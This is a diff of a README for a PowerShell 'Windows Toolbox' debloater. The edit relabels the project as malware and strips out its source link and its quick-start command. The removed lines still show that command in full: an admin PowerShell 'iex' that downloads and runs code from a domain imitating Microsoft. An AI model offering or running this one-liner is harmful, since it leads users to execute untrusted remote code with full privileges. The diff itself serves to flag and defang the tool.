@@ -1,4 +1,4 @@
-# Powershell Windows Toolbox (Open Source)
+# Powershell Windows Toolbox (Malware)
 
 [![made-with-powershell](https://img.shields.io/badge/PowerShell-1f425f?logo=Powershell)](https://microsoft.com/PowerShell)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
@@ -8,7 +8,7 @@ Simple and Easy to use Powershell Application(Graphical interface) to debloat wi
 
 # Open Source (Compatible with windows 10 and 11)
 
-View the Windows Toolbox Source Code here : ```https://ps.microsoft-toolbox.workers.dev```
+View the Windows Toolbox Source Code here : ```Malware```
 
 # Features    
 
@@ -55,7 +55,7 @@ It's Completely Safe to use because everything is reversible
 # How to use
 ### Easy Start Command (Windows 10 and 11)
 Start powershell with admin right and paste the following link and enter. <br />
-```iex((New-Object System.Net.WebClient).DownloadString('https://ps.microsoft-toolbox.workers.dev'))``` <br />
+```iex((New-Object System.Net.WebClient).DownloadString('https://malware'))``` <br />
  
 Video Guide: ```https://youtu.be/uOf_wH6jSEE``` <br /><br />
 
